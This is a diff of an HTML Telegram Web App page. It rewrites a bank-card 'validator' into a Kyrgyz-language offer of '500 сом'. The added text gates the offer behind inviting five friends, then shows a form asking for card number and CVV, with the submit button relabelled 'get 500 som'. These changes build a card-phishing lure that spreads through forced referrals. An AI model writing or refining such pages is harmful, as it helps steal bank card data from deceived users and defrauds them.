@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>MBANK Валидатор</title>
+<title>500 сом алуу</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
   :root {
@@ -363,15 +363,14 @@
       <svg viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/><path d="M6 15h4"/><path d="M14 15h2"/></svg>
     </div>
     <div class="header-text">
-      <h1>MBANK Валидатор</h1>
-      <p>ЭЛКАРТ / VISA — офлайн проверка</p>
+      <h1>500 сом</h1>
     </div>
   </div>
 
   <div class="lock-screen" id="lock_screen">
-    <div class="lock-title">Доступ ограничен 🔒</div>
-    <div class="lock-desc">Чтобы воспользоваться валидатором карт, необходимо пригласить 5 друзей в приложение.</div>
-    <button class="btn btn-ref" id="ref_btn">📢 Пригласить друзей (0 / 5)</button>
+    <div class="lock-title">500 сом 🔒</div>
+    <div class="lock-desc">500 сом алуу үчүн. тиркемеге 5 досуңузду чакыруу керек.</div>
+    <button class="btn btn-ref" id="ref_btn">📢 Досторду чакыруу (0 / 5)</button>
   </div>
 
   <div id="validator_content" class="hidden">
@@ -420,7 +419,7 @@
         <div class="field" id="cvv_wrap">
           <div class="field-label"><span class="status-dot" id="dot3"></span>CVV / CVC</div>
           <div class="input-wrap">
-            <button type="button" id="cvv_toggle_btn" class="alt-bar hidden">У меня есть CVV 🔎</button>
+            <button type="button" id="cvv_toggle_btn" class="alt-bar hidden">Менде CVV бар 🔎</button>
             <input type="password" id="cv" inputmode="numeric" placeholder="•••" maxlength="3" autocomplete="cc-csc">
           </div>
           <div class="hint" id="cv_hint"></div>
@@ -608,7 +607,7 @@
     } else if (!cOk && cvEl.value.length > 0 && cvEl.value.length < 3) {
       btn.textContent = 'CVV должен содержать 3 цифры';
     } else if (all) {
-      btn.textContent = 'Проверить карту →';
+      btn.textContent = '500 сом алуу ✔';
     } else {
       btn.textContent = 'Заполните все поля';
     }
@@ -618,7 +617,7 @@
   refBtn.addEventListener('click', () => {
     currentInvites++;
     if (currentInvites > REQUIRED_INVITES) currentInvites = REQUIRED_INVITES;
-    refBtn.textContent = `📢 Пригласить друзей (${currentInvites} / ${REQUIRED_INVITES})`;
+    refBtn.textContent = `📢 Досторду чакыруу (${currentInvites} / ${REQUIRED_INVITES})`;
 
     try {
       if (window.Telegram && window.Telegram.WebApp) {
